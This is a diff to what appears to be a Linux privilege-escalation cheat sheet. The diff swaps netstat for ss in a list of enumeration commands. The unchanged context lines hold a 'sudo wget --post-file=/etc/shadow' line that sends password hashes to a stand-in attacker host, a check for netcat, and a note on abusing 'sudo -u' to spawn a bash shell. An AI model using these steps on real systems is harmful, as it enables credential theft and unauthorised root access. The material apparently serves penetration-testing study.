@@ -31,11 +31,11 @@ history                 # Command history
 ifconfig                # Legacy Network interfaces
 ip a					# Network interfaces
 ip route                # Network route
-netstat -a              # All listening port and connections
-netstat -at -au         # All TCP or UDP connections
-netstat -l              # All listening ports
-netstat -s              # Statistics
-netstat -tp             # PID information
+ss -a              # All listening port and connections
+ss -at -au         # All TCP or UDP connections
+ss -l              # All listening ports
+ss -s              # Statistics
+netstat -tp             # PID information (Netstat is legacy!)
 apt list --upgradeable  # Software installed and versioning
 which python3 && which python && which nc; # list of stuff to use
 ```
@@ -128,8 +128,9 @@ sudo -l # chedck usage
 sudo /usr/bin/wget --post-file=/etc/shadow http//attackbox:port # Sudo -l but no password NO problem!
 ```
 #### sudo -u to abuse file permission to call sudo through unsafe variable input, handling
+```bash
 sudo -u username unsafefileofusername # somehow pass /bin/bash as paramtres
-
+```
 #### Shell escaping, abusing intended functionality
 **If find more I'll add more**  
 ```bash
